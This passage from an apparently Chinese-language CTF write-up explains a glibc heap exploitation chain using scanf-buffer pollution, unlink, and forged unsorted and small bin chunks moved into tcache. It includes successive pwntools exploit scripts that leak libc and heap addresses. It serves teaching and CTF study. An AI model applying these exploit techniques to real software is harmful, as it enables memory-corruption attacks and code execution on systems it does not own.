class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx); <span class="comment">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是代码中的这个部分，下面代码中，bin就是当前small bin的位置，通过bk索引，反向查找，对于每一个Chunk依次解链，放入了Tcache bin中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123;</span><br><span class="line">      <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) &#123;</span><br><span class="line">          bck = tc_victim-&gt;bk;</span><br><span class="line">          set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          </span><br><span class="line">          tcache_put (tc_victim, tc_idx); <span class="comment">// !!!!!! 注意这里 放入了tcache内</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目标明确，那么命中small bin需要先绕过Tcache，也就是当前<code>Tcache[0x90]</code>不能有free的堆块，以及需要一次<code>malloc(0x80)</code>，那么我们伪造的small bin大小也需要是0x90</p>
<h2 id="伪造Small-bin（0x90）可行性讨论"><a href="#伪造Small-bin（0x90）可行性讨论" class="headerlink" title="伪造Small bin（0x90）可行性讨论"></a>伪造Small bin（0x90）可行性讨论</h2><p>如何伪造一个0x90大小的Small bin呢？进入Small bin可以从Unsorted bin进入，如何进入呢？</p>
<ol>
<li>当前Unsorted bin中有一个0x90大小的堆块空闲</li>
<li>malloc一次大于0x90大小的堆块<code>size &gt;= 0x90 &amp;&amp; malloc(size)</code>，且不能命中Tcache</li>
</ol>
<p>条件2比较简单满足，依旧是scanf利用</p>
<p>对于我们现在的堆块布局来说，我们仅仅只能控制0x90堆块size位（看上文的泄露后堆布局情况图片），这个位置能做什么文章呢？那么答案十分明朗：<strong>伪造Unsorted bin！</strong></p>
<p>我们先讨论一下，是否可行，我们能溢出可控空间为<code>0x80-0x40=0x40</code>，这个0x40大小的空间包括了下一个堆块的<code>prev_size</code>和<code>size</code>位置，以及堆块内容部分。假设我们能修改上图中0x90堆块的size位置改大，并能成功free，那么就会进入unsorted bin中，<strong>如果此时构造我们无法完成两块小哨兵块的布置</strong>，因为需要如下的布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">     | prev_size |  size  |</span><br><span class="line">     +--------------------+</span><br><span class="line">0x00 |           |  0x50  |    </span><br><span class="line">0x10 |           |        |    -- 可控起始位置</span><br><span class="line">     +--------------------+   &lt;- Unsorted bin</span><br><span class="line">0x50 |           |  0x91  |</span><br><span class="line">0x90 |           |        |    </span><br><span class="line">0xD0 |           |        |    -- 可控终止位置</span><br><span class="line">     +--------------------+</span><br><span class="line">0xE0 |           |  0x10  |    -- Chunk A</span><br><span class="line">     +--------------------+</span><br><span class="line">0xF0 |           |  0x11  |    -- Chunk B</span><br><span class="line">     +--------------------+</span><br></pre></td></tr></table></figure>

<p>（可控地址指的是，我们可以通过malloc(0x40)向后写0x80字节，以及malloc(0x80)也能写0x80字节，上面例子也就是总长度可控为<code>0x80*2-0x40=0xC0</code>）</p>
<p>但是可控空间完全不够布置下面的Chunk AB，要怎么办呢？我们需要可控多长呢？</p>
<p>在绞尽脑汁几个小时之后，我注意到了我们貌似浪费了0x50堆块中的0x40长度的大小。怎么办呢？</p>
<h2 id="Unlink扩展溢出距离"><a href="#Unlink扩展溢出距离" class="headerlink" title="Unlink扩展溢出距离"></a>Unlink扩展溢出距离</h2><p>这里我们可以利用Unlink手法，使得Unsorted bin向前合并，首先我们构造如下的布局</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">     | prev_size |  size      |</span><br><span class="line">     +------------------------+</span><br><span class="line">0x00 |           |  0x50      |    </span><br><span class="line">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class="line">0x20 |           |  0x31      |</span><br><span class="line">0x30 | fake fd   |  fake bk   |</span><br><span class="line">     +------------------------+    </span><br><span class="line">0x50 | 0x30      |  0x?0      |    -- 这里的prev_inuse设置为0</span><br><span class="line">0x90 |           |            |    </span><br><span class="line">0xD0 |           |            |    -- 可控终止位置</span><br><span class="line">     +------------------------+</span><br></pre></td></tr></table></figure>

<p>使得在free掉下方堆块的时候可以向后合并，这样子就可以完成溢出可控距离的扩展</p>
<p>那么这个时候再来讨论一下可控长度，我们此时修改Unsorted bin内的布局，此时我们发现可控距离完全足够进行布局了！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">     | prev_size |  size      |</span><br><span class="line">     +------------------------+</span><br><span class="line">0x00 |           |  0x50      |    </span><br><span class="line">0x10 | fd        |  bk        |    -- 可控起始位置</span><br><span class="line">     +------------------------+</span><br><span class="line">0x20 |           |  0x91      |    &lt;- Unsorted bin  </span><br><span class="line">0x90 |           |            |</span><br><span class="line">     +------------------------+</span><br><span class="line">0xB0 |           |  0x10      |    -- Chunk A</span><br><span class="line">     +------------------------+</span><br><span class="line">0xC0 |           |  0x11      |    -- Chunk B</span><br><span class="line">     +------------------------+</span><br><span class="line">0xD0 |           |            |    -- 可控终止位置</span><br></pre></td></tr></table></figure>

<p>（仔细观察上面三个布局演示，可控起始和终止的偏移从未变化，仅仅通过Unlink之后利用率提高了）</p>
<p>如何实现Unlink？</p>
<p>只需要满足下面的条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p;</span><br><span class="line">p-&gt;bk = p;</span><br><span class="line">next(p)-&gt;prev_inuse = <span class="number">0</span>;</span><br><span class="line">next(p)-&gt;prev_size = p-&gt;size;</span><br></pre></td></tr></table></figure>

<p>绕过源码中，下面这个检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr fd = p-&gt;fd;</span><br><span class="line">mchunkptr bk = p-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>但是但是，现在还有一个问题，实现unlink攻击，需要free掉一个大的堆块进入Unsorted bin内，也就是说，我们需要修改原来0x90堆块的size改大，并需要满足free的Unsorted bin检查，也就是，尽量不要进入向前合并流程（因为我们本来可控的空间就只有上面的<code>[0x10,0xD0]</code>），那么需要如何做呢？请读者再压下脑栈，马上就要串起来了，继续往下看！</p>
<h2 id="伪造Unsorted-bin"><a href="#伪造Unsorted-bin" class="headerlink" title="伪造Unsorted bin"></a>伪造Unsorted bin</h2><p>我们再次回顾一下当前的堆布局，可以看到当前unsorted bin下方有一个0x10和0x11的堆块，那么我们假设，如果有某种方法，使得0x90这个堆块覆盖成以下的红色框框圈起来呢？并且是否有方法让下方0x11堆块之后的prev_inuse变成1呢？（为何要为1，因为要防止合并）</p>
<p><img src="/p/houseofminho-wp/image-20231118013645858.png" alt="image-20231118013645858"></p>
<p>什么时候能修改最下方堆块的内容呢？答案是还是<code>scanf</code>！</p>
<p>scanf的缓冲区会申请再堆内，那我如果缓冲区足够大是否能够刚好往0x11堆块的后面size内写入一些数据呢？写入多少呢？</p>
<p><code>0x33</code>！！！因为这个ascii字符是<code>3</code>，也就是选择free的菜单选项，什么时候写入呢？当然是最最最开始的时候，堆十分“干净”的时候啦</p>
<p>那么经过测试，再所有操作之前输入0xd58个字符0以及一个字符3即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">free3</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span> * (<span class="built_in">len</span>-<span class="number">1</span>) + <span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free3(<span class="number">0xd59</span>) <span class="comment"># 这里就是污染0x11堆块之后的堆块的size位置</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>))</span><br></pre></td></tr></table></figure>

<p>让我们再看看堆块长什么样子了</p>
<p><img src="/p/houseofminho-wp/image-20231118014409013.png" alt="image-20231118014409013"></p>
<p>WoW！！成功污染！那么我们就能成功伪造Unsorted bin了，稍微微调以下代码可以得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">free3(<span class="number">0xd59</span>) </span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># 这里微调了0x90堆块的size位置，不再是修复而是伪造</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xd01</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>此时我们可以看到unsorted bin内如愿以偿的放入了我们的Fake Chunk！</p>
<p><img src="/p/houseofminho-wp/image-20231118014647807.png" alt="image-20231118014647807"></p>
<h2 id="Unlink攻击以及Smallbin伪造攻击实施"><a href="#Unlink攻击以及Smallbin伪造攻击实施" class="headerlink" title="Unlink攻击以及Smallbin伪造攻击实施"></a>Unlink攻击以及Smallbin伪造攻击实施</h2><p>感谢你耐心看到这里，相信你现在脑栈已经快爆了，终于我们迎来了弹出脑栈的步骤了</p>
<p>将上文的Unlink攻击实施，微调Exp可以得到如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">free3(<span class="number">0xd59</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># 这里修改了unlink攻击的内容</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap_base+<span class="number">0x2c0</span>) * <span class="number">2</span> +  <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0xd00</span>))</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>此时堆块就不那么好看了。</p>
<p><img src="/p/houseofminho-wp/image-20231118015159589.png" alt="image-20231118015159589"></p>
<p>如此查看我们可以发现unlink成功实施了，Unsorted bin内第一个堆块从0xd00变成了0xd30</p>
<p>那么继续我们将伪造Small bin的攻击实施，再次微调Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">free3(<span class="number">0xd59</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xd11</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base : <span class="subst">&#123;libc_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x48</span> + p64(<span class="number">0xcf1</span>))</span><br><span class="line"></span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Data: &quot;</span> + <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span>)</span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base : <span class="subst">&#123;heap_base:#x&#125;</span>&quot;</span>)</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">1</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(heap_base+<span class="number">0x2c0</span>) * <span class="number">2</span> +  <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0xd00</span>))</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># 这次微调了这里，加入了上文提到的Chunk AB的布置</span></span><br><span class="line">add(<span class="number">2</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x50</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x10</span>) + p64(<span class="number">0x00</span>) + p64(<span class="number">0x11</span>))</span><br><span class="line">free()</span><br><span class="line"><span class="comment"># 这里就开始修改Unsorted bin内容，使得在Unsorted bin内伪造一个Small bin大小的堆块</span></span><br><span class="line">add(<span class="number">1</span>, flat(&#123;</span><br><span class="line">    <span class="number">0x10</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x18</span>: <span class="number">0x91</span>,</span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x380</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + <span class="number">0x219ce0</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">show2(<span class="number">0x1000</span>) <span class="comment"># 这里触发使得Unsorted bin进入Samll bin</span></span><br><span class="line">free()</span><br></pre></td></tr></table></figure>

<p>让我们再次检验堆块的结构！完美成功进入了Small bin！！！</p>
<p><img src="/p/houseofminho-wp/image-20231118015627633.png" alt="image-20231118015627633"></p>
<p>那么接下来我们就要开始在Small bin里面伪造一条多个0x90的链条，使得再次malloc(0x80)命中small bin的时候，放入Tcache bin中</p>
<h2 id="修改Small-bin"><a href="#修改Small-bin" class="headerlink" title="修改Small bin"></a>修改Small bin</h2><p>首先我们需要知道我们能改动多长？0x80长度，然而除去tcache bin的fd和bk位置，仅剩下0x70长度可以可控，也就是说，我们需要在0x70的长度中尽可能多的伪造0x90堆块，并串起来</p>
<p>我们仅仅只能伪造3个0x90的堆块，如何伪造？</p>
<p>可以参考如下图的伪造方法，可以看到这里bk连线串成了一条链</p>
<p><img src="/p/houseofminho-wp/houseofminho_smallbin.png" alt="houseofminho_smallbin"></p>
<p>注意红色Chunk位置的fd设置，需要绕过small bin中的检查（下面源码），而黄色的绿色的fd是否需要设置，留给读者们讨论</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那么稍微微调一下exp</p>
